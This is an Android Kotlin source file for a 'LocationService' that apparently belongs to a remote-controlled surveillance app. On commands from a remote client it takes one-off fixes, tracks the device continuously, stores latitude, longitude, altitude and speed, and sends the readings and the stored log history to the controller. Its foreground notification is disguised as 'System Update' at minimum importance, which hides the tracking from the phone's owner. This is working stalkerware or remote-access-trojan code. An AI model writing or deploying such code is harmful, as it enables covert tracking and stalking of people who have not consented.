package ai.obsidian.agent.svc

import ai.obsidian.agent.AgentApp
import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.IBinder
import android.os.Looper
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class LocationService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private lateinit var app: AgentApp
    private var manager: LocationManager? = null

    private val listener = LocationListener { location -> report(location) }

    override fun onCreate() {
        super.onCreate()
        app = application as AgentApp
        manager = getSystemService(LocationManager::class.java)
        val notificationManager = getSystemService(NotificationManager::class.java)
        if (notificationManager.getNotificationChannel(CHANNEL_ID) == null) {
            notificationManager.createNotificationChannel(
                NotificationChannel(CHANNEL_ID, "Location", NotificationManager.IMPORTANCE_MIN)
            )
        }
        startForeground(NOTIFICATION_ID, buildNotification())
    }

    @SuppressLint("MissingPermission")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!hasPermission()) {
            finish("no location permission")
            return START_NOT_STICKY
        }

        when (intent?.action) {
            ACTION_TRACK -> startTracking()
            ACTION_HISTORY -> sendHistory()
            else -> singleFix()
        }
        return START_STICKY
    }

    private fun hasPermission(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    @SuppressLint("MissingPermission")
    private fun singleFix() {
        val locationManager = manager ?: return finish("no manager")
        var requested = false

        for (provider in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
            if (!locationManager.isProviderEnabled(provider)) continue
            requested = true
            runCatching {
                locationManager.requestLocationUpdates(provider, 0L, 0f, listener, Looper.getMainLooper())
            }
        }

        locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)?.let { report(it) }

        if (!requested) {
            app.client?.let { client ->
                scope.launch { client.send("msg", "loc: no provider enabled") }
            }
        }

        scope.launch {
            delay(WINDOW_MILLIS)
            stopSelf()
        }
    }

    @SuppressLint("MissingPermission")
    private fun startTracking() {
        val locationManager = manager ?: return finish("no manager")
        for (provider in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
            if (!locationManager.isProviderEnabled(provider)) continue
            runCatching {
                locationManager.requestLocationUpdates(
                    provider, TRACK_INTERVAL_MILLIS, TRACK_DISTANCE_METERS, listener, Looper.getMainLooper()
                )
            }
        }
    }

    private fun sendHistory() {
        val history = app.store.tail(LOG_NAME, 100).ifEmpty { "empty" }
        app.client?.let { client -> scope.launch { client.send("msg", history) } }
        stopSelf()
    }

    private fun report(location: Location) {
        val line = buildString {
            append("%.6f,%.6f".format(location.latitude, location.longitude))
            append(" ±%.0fm".format(location.accuracy))
            if (location.hasAltitude()) append(" alt=%.1f".format(location.altitude))
            if (location.hasSpeed()) append(" v=%.1f".format(location.speed))
        }
        app.store.append(LOG_NAME, "${System.currentTimeMillis()} $line")
        app.client?.let { client -> scope.launch { client.send("msg", "LOC $line") } }
    }

    private fun finish(message: String) {
        app.client?.let { client -> scope.launch { client.send("msg", message) } }
        stopSelf()
    }

    private fun buildNotification(): Notification =
        Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setContentTitle("System Update")
            .setContentText("Location")
            .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        runCatching { manager?.removeUpdates(listener) }
        scope.cancel()
        super.onDestroy()
    }

    companion object {
        private const val CHANNEL_ID = "obsidian.loc"
        private const val NOTIFICATION_ID = 0x0B51D1E
        private const val ACTION_TRACK = "track"
        private const val ACTION_HISTORY = "history"
        private const val LOG_NAME = "loc.log"
        private const val WINDOW_MILLIS = 20_000L
        private const val TRACK_INTERVAL_MILLIS = 15_000L
        private const val TRACK_DISTANCE_METERS = 10f

        fun once(context: Context) {
            context.startForegroundService(Intent(context, LocationService::class.java))
        }

        fun startTracking(context: Context) {
            context.startForegroundService(
                Intent(context, LocationService::class.java).setAction(ACTION_TRACK)
            )
        }

        fun history(context: Context) {
            context.startForegroundService(
                Intent(context, LocationService::class.java).setAction(ACTION_HISTORY)
            )
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, LocationService::class.java))
        }
    }
}
